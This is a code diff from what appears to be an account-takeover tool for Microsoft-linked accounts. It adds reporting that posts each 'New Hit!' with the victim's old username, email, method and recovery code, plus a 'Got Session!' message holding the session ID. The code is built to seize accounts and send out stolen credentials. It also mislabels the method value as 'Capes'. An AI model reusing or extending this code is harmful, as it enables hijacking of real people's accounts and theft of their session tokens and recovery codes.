@@ -6,7 +6,8 @@ import json
 def startSecuringAccount(email: str, device: str = None, code: str = None):
     if not device:
         device = json.load(open("data.json", "r+"))["flowtoken"] 
-        
+    
+    # str or None
     msaauth = getMSAAUTH(email, device, code)
     
     if msaauth is None:
@@ -17,11 +18,20 @@ def startSecuringAccount(email: str, device: str = None, code: str = None):
     account = secure(msaauth)
     print(account)
 
-    # embed = Embed(
-    #     title = f"New Hit!"
-    # )
+    hit_embed = Embed(
+        title = f"New Hit!"
+    )
 
-    # embed.add_field(
-    #     name = "Email: ", value = f"```{account[]}```"
-    # )
-    return account
+    # To replace oldEmail -> Email
+    hit_embed.add_field(name = "Username:\n", value = f"```{account["oldName"]}```")
+    hit_embed.add_field(name = "Email:\n", value = f"```{account["oldEmail"]}```")
+    hit_embed.add_field(name = "Method:\n", value = f"```{account["method"]}```")
+    hit_embed.add_field(name = "Capes:\n", value = f"```{account["method"]}```")
+    hit_embed.add_field(name = "Recovery Code:\n", value = f"```{account["recoveryCode"]}```")
+
+    session_embed = Embed(
+        title = "Got Session!",
+        description = f"```{account["SSID"]}```"
+    )
+
+    return [hit_embed, session_embed]
